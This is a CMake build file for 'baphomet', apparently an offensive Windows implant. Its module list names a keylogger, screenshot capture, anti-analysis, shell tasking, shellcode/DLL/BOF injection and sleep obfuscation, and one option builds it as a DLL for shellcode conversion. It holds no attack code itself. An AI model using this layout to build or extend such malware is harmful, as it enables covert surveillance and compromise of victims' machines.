cmake_minimum_required(VERSION 3.28)
project(baphomet)

set(CMAKE_CXX_STANDARD 17)
set(MAIN_INCLUDE_DIR ${CMAKE_CURRENT_SOURCE_DIR}/include)


option(BUILD_AS_DLL "Build as Windows x64 DLL" ON)
option(DEBUG_BUILD "Compile with debug messages" ON)


if(MSVC)
    add_compile_options(
            $<$<CONFIG:>:/MT>
            $<$<CONFIG:Debug>:/MTd>
            $<$<CONFIG:Release>:/MT>
    )
endif()


set(SOURCE_FILES
        src/main.cpp
        src/networking/http/send.cpp
        src/networking/http/init.cpp
        src/networking/http/recieve.cpp

        src/reconnaissance/screenshot.cpp
        src/reconnaissance/basic.cpp
        src/reconnaissance/procenum.cpp
        src/reconnaissance/whoami.cpp
        src/reconnaissance/keylogger.cpp

        src/util/controlflow_guard.cpp
        src/util/init_config.cpp
        src/util/hash.cpp
        src/util/dispatch.cpp
        src/util/io.cpp
        src/util/memory.cpp
        src/util/basic.cpp

        src/tasking/basic/filesystem.cpp
        src/tasking/basic/anti_analysis.cpp
        src/tasking/basic/shell.cpp
        src/tasking/injection/runbof.cpp
        src/tasking/injection/beacon_api.cpp
        src/tasking/injection/shellcode.cpp
        src/tasking/injection/runexe.cpp
        src/tasking/injection/rundll.cpp

        src/obfuscation/sleep.cpp

        include/main.hpp
        include/beacon_api.hpp
        include/common.hpp
        include/filesystem.hpp
        include/function_ptrs.hpp
        include/http.hpp
        include/injection.hpp
        include/io.hpp
        include/macro.hpp
        include/misc.hpp
        include/reconnaissance.hpp
        include/shell.hpp
        include/sleep.hpp
        include/structs.hpp
        include/dispatch.hpp
        include/anti_analysis.hpp
)


if(BUILD_AS_DLL)
    add_library(baphomet SHARED ${SOURCE_FILES})
    target_compile_definitions(baphomet PRIVATE BAPHOMET_COMPILE_FOR_SHELLCODE)
    message(STATUS "Cmake Build option: DLL (for shellcode conversion)")
else()
    add_executable(baphomet ${SOURCE_FILES})
    target_compile_definitions(baphomet PRIVATE BAPHOMET_COMPILE_FOR_EXE)
    message(STATUS "Cmake Build option: executable")
endif()


if(MSVC)
    target_link_options(baphomet PRIVATE "/SECTION:.baph,RW")
endif()


if(DEBUG_BUILD)
    target_compile_definitions(baphomet PRIVATE BAPHOMET_DEBUG)
endif()


target_include_directories(baphomet PRIVATE ${MAIN_INCLUDE_DIR})